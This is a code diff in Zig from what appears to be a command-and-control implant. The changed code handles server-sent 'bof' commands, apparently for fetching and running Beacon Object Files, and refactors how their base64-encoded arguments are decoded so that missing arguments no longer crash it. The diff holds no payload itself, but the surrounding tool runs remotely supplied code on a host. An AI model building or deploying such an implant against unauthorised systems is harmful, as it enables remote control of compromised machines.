@@ -68,12 +68,14 @@ fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]const u
 }
 
 const State = struct {
+    base64_decoder: std.base64.Base64Decoder,
     base64_encoder: std.base64.Base64Encoder,
     http_client: std.http.Client,
     heartbeat_header: std.http.Headers,
     heartbeat_uri: std.Uri,
 
     fn init(allocator: std.mem.Allocator) !State {
+        const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
         const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
 
         var heartbeat_header = std.http.Headers{ .allocator = allocator };
@@ -106,6 +108,7 @@ const State = struct {
         }
 
         return State{
+            .base64_decoder = base64_decoder,
             .base64_encoder = base64_encoder,
             .http_client = http_client,
             .heartbeat_header = heartbeat_header,
@@ -165,13 +168,14 @@ fn process(allocator: std.mem.Allocator, state: *State) !void {
         if (std.mem.eql(u8, cmd_prefix, "bof")) {
             std.log.info("Executing bof: {s}", .{cmd_name});
 
-            // TODO: Crashes in debug mode because `args` is `null`
-            const bof_args_b64 = root.object.get("args").?.string;
-            const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
-            const len = try std.base64.Base64Decoder.calcSizeForSlice(&base64_decoder, bof_args_b64);
-            const bof_args = try allocator.alloc(u8, len);
-            defer allocator.free(bof_args);
-            _ = try std.base64.Base64Decoder.decode(&base64_decoder, bof_args, bof_args_b64);
+            const bof_args = if (root.object.get("args")) |value| bof_args: {
+                const len = try state.base64_decoder.calcSizeForSlice(value.string);
+                const bof_args = try allocator.alloc(u8, len);
+                errdefer allocator.free(bof_args);
+                _ = try state.base64_decoder.decode(bof_args, value.string);
+                break :bof_args bof_args;
+            } else null;
+            defer if (bof_args) |args| allocator.free(args);
 
             const bof_path = root.object.get("path").?.string;
 
